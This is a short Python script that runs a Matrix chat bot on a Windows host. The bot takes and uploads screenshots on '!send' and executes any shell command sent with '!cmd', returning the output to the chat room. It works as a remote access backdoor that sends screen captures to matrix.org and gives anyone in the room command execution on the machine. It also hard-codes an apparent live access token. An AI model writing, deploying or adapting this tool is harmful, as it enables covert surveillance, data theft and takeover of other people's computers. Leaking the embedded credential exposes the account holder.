import os
import subprocess
import simplematrixbotlib as botlib
from mss import mss

creds = botlib.Creds(
    homeserver="https://matrix.org",
    username="@jesuslovesnipples:matrix.org",
    access_token="mct_6SNByYmWTBWRrspvYrVrJ9tEGfyFNq_c0MBd1"
)

bot = botlib.Bot(creds)
IMG_PATH = r"C:\Users\Public\screenshot.png"

@bot.listener.on_message_event
async def handle_commands(room, message):
    match = botlib.MessageMatch(room, message, bot)
    if not match.is_not_from_this_bot():
        return

    # Command: !send -> Take Screenshot
    if match.command("send") or match.command("!send"):
        with mss() as sct:
            sct.shot(mon=1, output=IMG_PATH)
        if os.path.exists(IMG_PATH):
            await bot.api.send_image_message(room.room_id, IMG_PATH)

    # Command: !cmd <command> -> Execute terminal command
    elif message.body.startswith("!cmd "):
        cmd = message.body[5:]
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
            await bot.api.send_text_message(room.room_id, f"```\n{output[:3000]}\n```")
        except Exception as e:
            await bot.api.send_text_message(room.room_id, f"Error: {e}")

if __name__ == "__main__":
    bot.run()

